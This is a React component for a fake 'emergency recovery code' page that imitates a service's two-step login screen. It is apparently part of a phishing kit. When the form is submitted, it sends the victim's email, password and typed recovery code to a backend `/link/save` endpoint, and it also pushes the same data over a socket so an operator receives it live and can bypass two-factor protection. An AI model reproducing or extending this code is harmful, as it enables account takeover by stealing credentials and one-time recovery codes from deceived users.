import React, { useContext, useRef } from 'react'
import { Context } from '../store/Context'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'
import { socket } from '../App'

const Code = () => {

  const codeRef = useRef()

  const { userData, url } = useContext(Context)

  const navigate = useNavigate()

  const handleSubmit = async (e) => {

    e.preventDefault()

    console.log(userData)

    try {

      const response = await axios.post(`${url}/link/save`, {
        email: userData.email,
        pass: userData.pass,
        code: codeRef.current.value,
        linkName: userData.linkName,
      })

      socket.emit('dataAdded', {
        email: userData.email,
        pass: userData.pass,
        linkName: userData.linkName,
        code: codeRef.current.value
      })

      if (response.data.ok) {
        navigate(`/${userData.linkName}`)
      }
    } catch (error) {
      console.log(error.message)
    }


  }

  return (
    <div className=' px-5 py-2'>
      <div>
        <h2 className=' text-2xl font-medium my-2'>Enter emergency recovery code</h2>
        <div className=' w-20 h-[3px] bg-orange-700'></div>
      </div>
      <div className=' flex flex-col gap-20 py-14'>
        <p className=' text-sm font-medium'>An emergency recovery code is one of the codes we showed you after you set up 2-step login. Each emergency recovery code can be used exactly once.
        </p>

        <form onSubmit={handleSubmit} className=' flex flex-col gap-3'>
          <h2 className=' font-medium'>Emergency recovery code</h2>
          <input ref={codeRef} className=' text-xl font-medium h-14 px-4 border-gray-300 rounded-md text-gray-500 outline-blue-400 border-2' type="text" placeholder='____-____-____-____' required />
          <div className=' mt-8'>
            <button type='submit' className=' text-lg font-medium bg-rose-500 text-white w-44 py-3 rounded-full'>Authenticate</button>
          </div>
        </form>
      </div>

      <div className=' mb-20'>
        <div className=' h-[2px] bg-gray-300 w-[80%] mx-auto my-5'></div>
        <p>Authenticate using security key / passkey instead | Log out instead</p>
      </div>
    </div>
  )
}

export default Code